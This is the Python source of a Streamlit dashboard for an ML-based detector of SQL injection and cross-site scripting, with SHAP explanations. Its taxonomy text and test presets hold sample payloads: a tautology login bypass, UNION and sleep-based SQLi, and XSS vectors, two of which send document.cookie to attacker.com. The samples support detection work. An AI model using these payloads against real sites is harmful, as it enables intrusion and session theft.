"""
XAI-WebGuard: An Explainable Machine Learning-Based Framework for
Detecting SQL Injection and Cross-Site Scripting Attacks

Interactive Streamlit Web Application Dashboard
"""

import os
import sys
import json
import html
import joblib
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
import streamlit as st

# Configure Streamlit page settings
st.set_page_config(
    page_title="XAI-WebGuard | Explainable Cybersecurity AI",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Custom CSS for modern cybersecurity SOC aesthetic
st.markdown("""
<style>
    .main-title {
        font-size: 2.2rem;
        font-weight: 800;
        color: #1e3a8a;
        margin-bottom: 0.2rem;
    }
    .sub-title {
        font-size: 1.05rem;
        color: #4b5563;
        margin-bottom: 1.5rem;
    }
    .card {
        background-color: #ffffff;
        border: 1px solid #e5e7eb;
        border-radius: 12px;
        padding: 1.3rem;
        box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05), 0 2px 4px -1px rgba(0,0,0,0.03);
        margin-bottom: 1.2rem;
    }
    .badge-benign {
        background-color: #d1fae5;
        color: #065f46;
        padding: 0.4rem 0.9rem;
        border-radius: 9999px;
        font-weight: 700;
        font-size: 0.95rem;
        border: 1px solid #10b981;
        display: inline-block;
    }
    .badge-sqli {
        background-color: #fee2e2;
        color: #991b1b;
        padding: 0.4rem 0.9rem;
        border-radius: 9999px;
        font-weight: 700;
        font-size: 0.95rem;
        border: 1px solid #ef4444;
        display: inline-block;
    }
    .badge-xss {
        background-color: #fef3c7;
        color: #92400e;
        padding: 0.4rem 0.9rem;
        border-radius: 9999px;
        font-weight: 700;
        font-size: 0.95rem;
        border: 1px solid #f59e0b;
        display: inline-block;
    }
    .badge-risk-critical {
        background-color: #dc2626;
        color: #ffffff;
        padding: 0.25rem 0.6rem;
        border-radius: 6px;
        font-weight: 700;
        font-size: 0.85rem;
    }
    .badge-risk-safe {
        background-color: #10b981;
        color: #ffffff;
        padding: 0.25rem 0.6rem;
        border-radius: 6px;
        font-weight: 700;
        font-size: 0.85rem;
    }
    .metric-value {
        font-size: 1.85rem;
        font-weight: 800;
        color: #1f2937;
    }
    .highlight-box {
        background-color: #0f172a;
        color: #f8fafc;
        border: 1px solid #334155;
        border-radius: 8px;
        padding: 1.2rem;
        font-family: 'Consolas', 'Courier New', monospace;
        font-size: 0.95rem;
        line-height: 1.8;
        word-break: break-all;
    }
    .term-kw {
        background-color: #ef4444;
        color: #ffffff;
        font-weight: bold;
        padding: 2px 6px;
        border-radius: 4px;
    }
    .term-tag {
        background-color: #f97316;
        color: #ffffff;
        font-weight: bold;
        padding: 2px 6px;
        border-radius: 4px;
    }
    .term-op {
        background-color: #eab308;
        color: #000000;
        font-weight: bold;
        padding: 2px 6px;
        border-radius: 4px;
    }
    .term-sink {
        background-color: #a855f7;
        color: #ffffff;
        font-weight: bold;
        padding: 2px 6px;
        border-radius: 4px;
    }
</style>
""", unsafe_allow_html=True)

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.dirname(__file__)))
from src.preprocessing import clean_and_normalize
from src.xai_explainer import WebGuardExplainer


@st.cache_resource
def load_system_artifacts():
    """Loads feature pipeline and trained machine learning models."""
    models_dir = os.path.join(os.path.dirname(__file__), "models")
    pipeline_path = os.path.join(models_dir, "hybrid_feature_pipeline.joblib")
    lr_path = os.path.join(models_dir, "logistic_regression.joblib")
    rf_path = os.path.join(models_dir, "random_forest.joblib")
    xgb_path = os.path.join(models_dir, "xgboost.joblib")

    if not all(os.path.exists(p) for p in [pipeline_path, lr_path, rf_path, xgb_path]):
        return None, None, None

    pipeline = joblib.load(pipeline_path)
    lr = joblib.load(lr_path)
    rf = joblib.load(rf_path)
    xgb = joblib.load(xgb_path)

    # Initialize SHAP explainer on best tree model (XGBoost)
    explainer = WebGuardExplainer(
        model=xgb,
        feature_pipeline=pipeline,
        feature_names=pipeline.get_feature_names()
    )

    return pipeline, {"XGBoost": xgb, "Random Forest": rf, "Logistic Regression": lr}, explainer


@st.cache_data
def load_evaluation_metrics():
    """Loads precomputed evaluation metrics and comparison table."""
    results_dir = os.path.join(os.path.dirname(__file__), "results")
    summary_path = os.path.join(results_dir, "metrics_summary.json")
    table_path = os.path.join(results_dir, "comparison_table.csv")

    summary = {}
    table_df = pd.DataFrame()

    if os.path.exists(summary_path):
        with open(summary_path, "r") as f:
            summary = json.load(f)

    if os.path.exists(table_path):
        table_df = pd.read_csv(table_path)

    return summary, table_df


@st.cache_data
def load_dataset_sample():
    """Loads dataset statistics and sample records."""
    data_path = os.path.join(os.path.dirname(__file__), "data", "cybersecurity_dataset.csv")
    if os.path.exists(data_path):
        return pd.read_csv(data_path)
    return None


# Sidebar Navigation & Settings
st.sidebar.image("https://img.icons8.com/fluency/96/shield.png", width=70)
st.sidebar.title("XAI-WebGuard")
st.sidebar.markdown("**Explainable ML Cybersecurity Framework**")
st.sidebar.markdown("*Joint Detection of SQLi & XSS Attacks*")
st.sidebar.markdown("---")

app_section = st.sidebar.radio(
    "Navigation Menu",
    [
        "🏠 A. Home Page",
        "🎯 B. Attack Detection",
        "💡 C. Explainable AI (XAI)",
        "📊 D. Model Performance",
        "📈 E. Dataset Analysis"
    ]
)

st.sidebar.markdown("---")
st.sidebar.markdown("### ⚙️ Classifier Configuration")
selected_model_name = st.sidebar.selectbox(
    "Active Inference Engine",
    ["XGBoost (Recommended - Champion)", "Random Forest", "Logistic Regression"]
)
active_model_key = "XGBoost" if "XGBoost" in selected_model_name else ("Random Forest" if "Random" in selected_model_name else "Logistic Regression")

st.sidebar.info("""
**Architecture Snapshot:**
- **TF-IDF Subword N-grams:** 2,500
- **Domain Features:** 15
- **Total Features:** 2,515
- **XAI Method:** TreeSHAP
- **Author:** Fauzia Khatoon
""")

# Load system artifacts
pipeline, models_dict, explainer = load_system_artifacts()
metrics_summary, comparison_df = load_evaluation_metrics()
dataset_df = load_dataset_sample()

if pipeline is None:
    st.error("⚠️ Model artifacts not found. Please ensure training has completed (`python scripts/02_train_and_evaluate.py`).")
    st.stop()


# -----------------------------------------------------------------------------
# TAB A: HOME PAGE
# -----------------------------------------------------------------------------
if app_section == "🏠 A. Home Page":
    st.markdown('<div class="main-title">🛡️ XAI-WebGuard Dashboard</div>', unsafe_allow_html=True)
    st.markdown('<div class="sub-title">An Explainable Machine Learning-Based Framework for Detecting SQL Injection and Cross-Site Scripting Attacks</div>', unsafe_allow_html=True)

    c1, c2, c3 = st.columns(3)
    with c1:
        st.markdown("""
        <div class="card">
            <h3 style="color: #059669;">🟢 Benign Request</h3>
            <p><strong>Class Label: 0</strong></p>
            <p>Legitimate HTTP traffic, normal e-commerce form inputs, search terms, and REST API queries. Verified against the HTTP CSIC 2010 dataset.</p>
            <hr>
            <small><strong>Operational Action:</strong> ALLOW (Forward to application backend)</small>
        </div>
        """, unsafe_allow_html=True)
    with c2:
        st.markdown("""
        <div class="card">
            <h3 style="color: #dc2626;">🚨 SQL Injection (SQLi)</h3>
            <p><strong>Class Label: 1 (CWE-89, CAPEC-66)</strong></p>
            <p>Relational query alteration via unauthorized tautologies (<code>OR 1=1</code>), <code>UNION SELECT</code> exfiltration, stacked queries, or time delays.</p>
            <hr>
            <small><strong>Operational Action:</strong> BLOCK (Alert Security Operations Center)</small>
        </div>
        """, unsafe_allow_html=True)
    with c3:
        st.markdown("""
        <div class="card">
            <h3 style="color: #d97706;">⚡ Cross-Site Scripting (XSS)</h3>
            <p><strong>Class Label: 2 (CWE-79, CAPEC-63)</strong></p>
            <p>Client-side script injection via unauthorized HTML elements (<code>&lt;script&gt;</code>, <code>&lt;img&gt;</code>), event attributes (<code>onerror=</code>), or DOM sinks.</p>
            <hr>
            <small><strong>Operational Action:</strong> BLOCK & SANITIZE (Neutralize DOM payload)</small>
        </div>
        """, unsafe_allow_html=True)

    st.markdown("### 📌 Why Explainable AI (XAI) in Web Application Firewalls?")
    st.markdown("""
    Conventional Web Application Firewalls (WAFs) rely on rigid regular expression signatures (e.g., OWASP ModSecurity Core Rule Set) that fail against evasive, polyglot, and double-encoded exploits.
    While modern Deep Learning (DL) models report high nominal detection scores, their **opaque black-box nature** induces **alert fatigue** in SOC analysts:
    - **Lack of Justification:** An analyst receiving an alarm cannot immediately tell *which character sequence* triggered the block.
    - **Spurious Correlation Risk:** Classifiers can accidentally latch onto irrelevant artifacts—such as request length or benign query parameter names—leading to unacceptable false-positive blocks that harm e-commerce revenue.
    - **XAI-WebGuard Solution:** Uses **TreeSHAP** to attribute predictions directly to human-understandable syntactic tokens and structural security indicators.
    """)

    st.markdown("### 🔬 Threat Taxonomy & Defense Specifications")
    t1, t2 = st.tabs(["💉 SQL Injection (CWE-89)", "⚡ Cross-Site Scripting (CWE-79)"])
    with t1:
        st.markdown("""
        #### CWE-89: Improper Neutralization of Special Elements used in an SQL Command
        - **Threat Mechanism (CAPEC-66):** Concatenation of unsanitized input into interpreter strings allowing query structure re-writing.
        - **Common Attack Patterns:**
          1. *Tautology Bypass:* `admin' OR '1'='1'--`
          2. *UNION-Based Exfiltration:* `1' UNION ALL SELECT username, password FROM users--`
          3. *Time-Based Blind:* `id=1; WAITFOR DELAY '0:0:5'--` or `AND SLEEP(5)`
          4. *Error-Based Enumeration:* `id=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)`
        - **Recommended Mitigations:** Parameterized Prepared Statements (`PreparedStatement` in Java, PDO in PHP, parameterized SQL in Python), Stored Procedures, Principle of Least Privilege.
        """)
    with t2:
        st.markdown("""
        #### CWE-79: Improper Neutralization of Input During Web Page Generation
        - **Threat Mechanism (CAPEC-63):** Injection of executable script syntax reflected or stored in browser context without context-aware encoding.
        - **Common Attack Patterns:**
          1. *Direct Tag Injection:* `<script>alert(document.cookie)</script>`
          2. *HTML Attribute Event Hijacking:* `<img src=x onerror=alert(1)>`
          3. *URI Execution Schemes:* `<a href="javascript:alert('XSS')">Click here</a>`
          4. *SVG / Polyglot Vectors:* `<svg onload=fetch('http://attacker.com?c='+document.cookie)>`
        - **Recommended Mitigations:** Context-Aware Output Encoding (HTML Body, Attribute, JavaScript, CSS), Content Security Policy (`Content-Security-Policy: default-src 'self'`), `HttpOnly` and `SameSite` Cookie Flags.
        """)


# -----------------------------------------------------------------------------
# TAB B: ATTACK DETECTION
# -----------------------------------------------------------------------------
elif app_section == "🎯 B. Attack Detection":
    st.markdown('<div class="main-title">🎯 Live Attack Detection & Payload Sandbox</div>', unsafe_allow_html=True)
    st.markdown('<div class="sub-title">Inspect incoming HTTP request parameters, URLs, and form payloads in real time.</div>', unsafe_allow_html=True)

    # Preset library
    presets = {
        "Custom Input (Type below)": "",
        "SQLi: Authentication Bypass (Tautology)": "admin' OR '1'='1'--",
        "SQLi: Union-Based Schema Extraction": "1' UNION SELECT 1, table_name, column_name FROM information_schema.columns--",
        "SQLi: Blind Sleep Delay": "id=42 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "SQLi: Obfuscated Hex / Double Encoded": "id=1%2520OR%25201%253D1--",
        "XSS: Reflected Document Cookie Stealer": "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
        "XSS: Image Error Event Execution": "<img src=invalid_image.jpg onerror=\"alert('XSS Exploit')\" />",
        "XSS: SVG Vector with Onload": "<svg/onload=alert('Vulnerable')>",
        "XSS: JavaScript URI Scheme": "<iframe src=\"javascript:alert('Embedded')\">",
        "Benign: Product Catalog Search": "/shop/products?category=electronics&sort=price_desc&limit=25",
        "Benign: Valid CSIC HTTP Request": "/tienda1/publico/anadir.jsp?id=2&nombre=Teclado+USB&precio=25&cantidad=2",
        "Benign: Customer Review Submission": "comment=I love this mechanical keyboard! It works wonderfully on Ubuntu Linux."
    }

    col_sel, col_empty = st.columns([3, 1])
    with col_sel:
        preset_choice = st.selectbox("⚡ Quick Test Presets (Select to load sample):", list(presets.keys()))

    default_text = presets[preset_choice] if preset_choice != "Custom Input (Type below)" else ""

    user_input = st.text_area(
        "Enter Raw HTTP Request Payload or URL String to Inspect:",
        value=default_text,
        height=110,
        placeholder="e.g. id=105 OR 1=1-- or <script>alert(1)</script>"
    )

    c_btn1, c_btn2 = st.columns([1, 4])
    with c_btn1:
        analyze_btn = st.button("🔍 Analyze Payload", type="primary")

    if analyze_btn or user_input.strip():
        if not user_input.strip():
            st.warning("Please enter a valid request payload or choose a preset from above.")
        else:
            active_model = models_dict[active_model_key]

            # Canonicalize
            canonical_text = clean_and_normalize(user_input)

            # Featurize
            X_vec = pipeline.transform([user_input])
            pred_class = int(active_model.predict(X_vec)[0])
            probas = active_model.predict_proba(X_vec)[0]

            classes = ["Benign Request", "SQL Injection", "Cross-Site Scripting"]
            pred_label = classes[pred_class]
            confidence = probas[pred_class]

            # Save state
            st.session_state["analyzed_input"] = user_input
            st.session_state["pred_class"] = pred_class
            st.session_state["confidence"] = confidence

            st.markdown("---")
            st.markdown("### 📋 Inspection Verdict & Threat Assessment")

            v1, v2, v3 = st.columns([2.5, 2.5, 3])
            with v1:
                if pred_class == 0:
                    badge_html = '<span class="badge-benign">🟢 BENIGN REQUEST</span>'
                    risk_html = '<span class="badge-risk-safe">SAFE</span>'
                    action_text = "ALLOW TRANSACTION"
                elif pred_class == 1:
                    badge_html = '<span class="badge-sqli">🚨 SQL INJECTION (SQLi)</span>'
                    risk_html = '<span class="badge-risk-critical">CRITICAL RISK</span>'
                    action_text = "BLOCK & LOG ALERT"
                else:
                    badge_html = '<span class="badge-xss">⚡ CROSS-SITE SCRIPTING (XSS)</span>'
                    risk_html = '<span class="badge-risk-critical">HIGH RISK</span>'
                    action_text = "BLOCK & PURGE"

                st.markdown(f"**Classification:**<br>{badge_html}", unsafe_allow_html=True)
                st.markdown(f"**Threat Severity:** {risk_html}", unsafe_allow_html=True)
                st.markdown(f"**Operational Policy:** `{action_text}`")
                st.markdown(f"**Classifier:** `{active_model_key}`")

            with v2:
                st.markdown(f"**Confidence Score:**<br><span class=\"metric-value\">{confidence*100:.2f}%</span>", unsafe_allow_html=True)
                st.progress(float(confidence))
                st.caption(f"Evaluated against 2,515 extracted features.")

            with v3:
                st.markdown("**Multi-Class Probability Distribution:**")
                prob_df = pd.DataFrame({
                    "Attack Category": classes,
                    "Probability": [f"{p*100:.3f}%" for p in probas]
                })
                st.table(prob_df)

            # Canonicalization comparison expander
            with st.expander("🔄 Canonicalization & Decoding Inspection (De-obfuscation)", expanded=False):
                st.markdown(f"**Raw Input Length:** `{len(user_input)}` chars")
                st.markdown(f"**Canonicalized Text:** `{canonical_text}`")
                st.markdown(f"**Canonical Length:** `{len(canonical_text)}` chars")
                if user_input != canonical_text:
                    st.info("Input underwent URL/HTML unescaping. Layered encodings were stripped down to canonical syntactic form.")
                else:
                    st.text("Input was already in canonical ASCII representation.")

            # Quick Highlights of Suspicious Terms
            suspicious = explainer.extract_suspicious_terms(user_input)
            st.markdown("### 🔎 Flagged Syntactic Tokens in Request")
            if suspicious:
                term_tags = []
                for s in suspicious:
                    cat = s["category"]
                    term_tags.append(f"`{s['term']}` ({cat})")
                st.warning("Attack Tokens Intercepted: " + " | ".join(term_tags))
            else:
                st.success("No explicit high-risk injection keywords or unauthorized HTML tags detected.")


# -----------------------------------------------------------------------------
# TAB C: EXPLAINABLE AI (XAI)
# -----------------------------------------------------------------------------
elif app_section == "💡 C. Explainable AI (XAI)":
    st.markdown('<div class="main-title">💡 Explainable Artificial Intelligence (XAI) Engine</div>', unsafe_allow_html=True)
    st.markdown('<div class="sub-title">Shapley Additive exPlanations (SHAP) for transparent, auditable cybersecurity decisions.</div>', unsafe_allow_html=True)

    input_to_explain = st.session_state.get("analyzed_input", "admin' OR '1'='1'--")

    st.markdown(f"**Currently Explaining:** `{input_to_explain}`")

    with st.spinner("Generating SHAP feature attributions and token-level explanations..."):
        explanation = explainer.explain_instance(input_to_explain, top_n=10)

    # 1. Natural Language Diagnostic Narrative
    st.markdown("### 📝 SOC Analyst Diagnostic Report")
    st.info(explanation["explanation_narrative"])

    # 2. Syntax Token Highlighting
    st.markdown("### 🖍️ Visual Input Token Attribution")
    st.markdown("The payload is marked up with character-level syntactic spans:")

    suspicious = explanation["suspicious_terms"]
    if suspicious:
        marked_html = ""
        last_idx = 0
        for item in suspicious:
            start, end = item["start"], item["end"]
            marked_html += html.escape(input_to_explain[last_idx:start])
            token_text = html.escape(input_to_explain[start:end])
            
            cat = item["category"]
            if "SQL Keyword" in cat:
                css_class = "term-kw"
            elif "HTML" in cat or "JavaScript" in cat:
                css_class = "term-tag"
            elif "Sink" in cat:
                css_class = "term-sink"
            else:
                css_class = "term-op"
            marked_html += f'<span class="{css_class}" title="{cat}">{token_text}</span>'
            last_idx = end
        marked_html += html.escape(input_to_explain[last_idx:])
        st.markdown(f'<div class="highlight-box">{marked_html}</div>', unsafe_allow_html=True)
        st.caption("🔴 Red = SQL Keywords | 🟠 Orange = HTML Tags / JS Handlers | 🟣 Purple = DOM Sinks | 🟡 Yellow = Operators / Delimiters")
    else:
        st.markdown(f'<div class="highlight-box">{html.escape(input_to_explain)}</div>', unsafe_allow_html=True)
        st.caption("No suspicious syntactic tokens found.")

    # 3. Local Feature Importance Bar Chart
    st.markdown("### 📊 Local SHAP Feature Attribution")
    st.markdown(f"Features pushing the prediction towards or away from **{explanation['prediction_label']}**:")

    top_feats = explanation["top_features"]
    feat_names = [f["feature"] for f in top_feats][::-1]
    shap_vals = [f["shap_value"] for f in top_feats][::-1]
    bar_colors = ["#dc2626" if val > 0 else "#2563eb" for val in shap_vals]

    fig, ax = plt.subplots(figsize=(10, 5))
    bars = ax.barh(feat_names, shap_vals, color=bar_colors)
    ax.axvline(0, color="black", linestyle="--", linewidth=0.8)
    ax.set_xlabel("SHAP Value (Impact on Prediction Log-Odds)", fontsize=10, fontweight="bold")
    ax.set_title(f"Local Feature Attributions for Classified Request: {explanation['prediction_label']}", fontsize=11, fontweight="bold")
    
    for bar in bars:
        width = bar.get_width()
        ha = "left" if width >= 0 else "right"
        offset = 0.02 if width >= 0 else -0.02
        ax.annotate(f"{width:+.3f}",
                    (width + offset, bar.get_y() + bar.get_height() / 2.),
                    ha=ha, va="center", fontsize=8.5, fontweight="bold")

    plt.tight_layout()
    st.pyplot(fig)
    plt.close()

    # Detailed Token Attribution Table
    with st.expander("📑 Detailed Feature Attribution Values", expanded=False):
        feat_df = pd.DataFrame(top_feats)[["feature", "feature_value", "shap_value", "impact"]]
        st.dataframe(feat_df, use_container_width=True)

    # 4. Global Feature Importance Plots
    st.markdown("---")
    st.markdown("### 🌐 Global SHAP Feature Importance Across the Dataset")

    results_dir = os.path.join(os.path.dirname(__file__), "results")
    g_path = os.path.join(results_dir, "shap_global_summary_bar.png")
    sqli_path = os.path.join(results_dir, "shap_sqli_importance.png")
    xss_path = os.path.join(results_dir, "shap_xss_importance.png")

    tab_glob, tab_sqli_g, tab_xss_g = st.tabs(["Global Overview (All Classes)", "SQLi Driver Features", "XSS Driver Features"])
    with tab_glob:
        if os.path.exists(g_path):
            st.image(g_path, use_container_width=True, caption="Top 15 Most Influential Features across all 3 Classes")
    with tab_sqli_g:
        if os.path.exists(sqli_path):
            st.image(sqli_path, use_container_width=True, caption="Top Features Driving SQL Injection Classification")
    with tab_xss_g:
        if os.path.exists(xss_path):
            st.image(xss_path, use_container_width=True, caption="Top Features Driving Cross-Site Scripting Classification")


# -----------------------------------------------------------------------------
# TAB D: MODEL PERFORMANCE
# -----------------------------------------------------------------------------
elif app_section == "📊 D. Model Performance":
    st.markdown('<div class="main-title">📊 Model Evaluation & Comparative Analysis</div>', unsafe_allow_html=True)
    st.markdown('<div class="sub-title">Empirical evaluation of Logistic Regression, Random Forest, and XGBoost on test data.</div>', unsafe_allow_html=True)

    if not comparison_df.empty:
        st.markdown("### 🏆 Comprehensive Algorithm Comparison Table")
        st.dataframe(
            comparison_df.style.highlight_max(
                subset=["Accuracy", "Macro Precision", "Macro Recall", "Macro F1", "Weighted F1", "Macro ROC-AUC"],
                color="#dcfce7"
            ),
            use_container_width=True
        )

        st.markdown("### 📈 Comparative Metrics Chart")
        results_dir = os.path.join(os.path.dirname(__file__), "results")
        perf_chart = os.path.join(results_dir, "performance_comparison.png")
        if os.path.exists(perf_chart):
            st.image(perf_chart, use_container_width=True, caption="Metric Scores across All Three Algorithms")

        c1, c2 = st.columns(2)
        with c1:
            st.markdown("### 🔲 Confusion Matrices (4,386 Test Samples)")
            cm_chart = os.path.join(results_dir, "confusion_matrices.png")
            if os.path.exists(cm_chart):
                st.image(cm_chart, use_container_width=True, caption="Confusion Matrices across All 3 Models")
        with c2:
            st.markdown("### 📉 Multi-Class One-vs-Rest ROC Curves")
            roc_chart = os.path.join(results_dir, "roc_curves.png")
            if os.path.exists(roc_chart):
                st.image(roc_chart, use_container_width=True, caption="ROC Curves per Attack Class (Macro AUC = 0.9999)")

        st.markdown("### ⏱️ Latency & Throughput Benchmark")
        bench_df = comparison_df[["Model", "Training Time (s)", "Inference Latency (ms/sample)"]].copy()
        bench_df["Throughput (Requests/sec)"] = (1000.0 / bench_df["Inference Latency (ms/sample)"]).astype(int)
        st.table(bench_df)
    else:
        st.info("Evaluation results are being computed...")


# -----------------------------------------------------------------------------
# TAB E: DATASET ANALYSIS
# -----------------------------------------------------------------------------
elif app_section == "📈 E. Dataset Analysis":
    st.markdown('<div class="main-title">📈 Dataset Exploration & Distribution Analysis</div>', unsafe_allow_html=True)
    st.markdown('<div class="sub-title">Statistical composition of the harmonized cybersecurity multi-class corpus.</div>', unsafe_allow_html=True)

    if dataset_df is not None:
        total_records = len(dataset_df)
        counts = dataset_df["category"].value_counts()

        c1, c2, c3, c4 = st.columns(4)
        c1.metric("Total Records", f"{total_records:,}")
        c2.metric("Benign Requests", f"{counts.get('Benign Request', 0):,}")
        c3.metric("SQL Injection", f"{counts.get('SQL Injection', 0):,}")
        c4.metric("Cross-Site Scripting", f"{counts.get('Cross-Site Scripting', 0):,}")

        st.markdown("---")
        c_left, c_right = st.columns([1, 1])
        with c_left:
            st.markdown("### 📊 Class Distribution (1:1:1 Balanced)")
            fig, ax = plt.subplots(figsize=(6, 4.5))
            colors = ["#2ecc71", "#e74c3c", "#3498db"]
            ax.pie(counts, labels=counts.index, autopct="%1.1f%%", colors=colors, startangle=140, explode=(0.04, 0.04, 0.04))
            ax.axis("equal")
            st.pyplot(fig)
            plt.close()

        with c_right:
            st.markdown("### 📏 Request Length Distribution")
            fig, ax = plt.subplots(figsize=(7, 4.5))
            sns.histplot(
                data=dataset_df,
                x="char_length",
                hue="category",
                bins=40,
                kde=True,
                palette=colors,
                ax=ax,
                log_scale=(True, False)
            )
            ax.set_title("Log-Scale Character Length Distribution", fontsize=11, fontweight="bold")
            ax.set_xlabel("Character Length (log scale)", fontsize=9, fontweight="bold")
            st.pyplot(fig)
            plt.close()

        st.markdown("### 🔍 Sample Dataset Records Explorer")
        filter_cat = st.selectbox("Filter Category:", ["All"] + list(counts.index))
        if filter_cat != "All":
            view_df = dataset_df[dataset_df["category"] == filter_cat]
        else:
            view_df = dataset_df

        search_query = st.text_input("Search substring in payloads:", placeholder="e.g. union, select, script, onerror")
        if search_query.strip():
            view_df = view_df[view_df["payload"].str.contains(search_query.strip(), case=False, na=False)]

        st.dataframe(view_df[["category", "char_length", "payload"]].head(100), use_container_width=True)

        # Download button
        csv_data = view_df.to_csv(index=False).encode('utf-8')
        st.download_button(
            label="📥 Download Filtered Samples (CSV)",
            data=csv_data,
            file_name=f"xai_webguard_export_{filter_cat.lower().replace(' ', '_')}.csv",
            mime="text/csv"
        )
    else:
        st.warning("Dataset not found at `data/cybersecurity_dataset.csv`.")
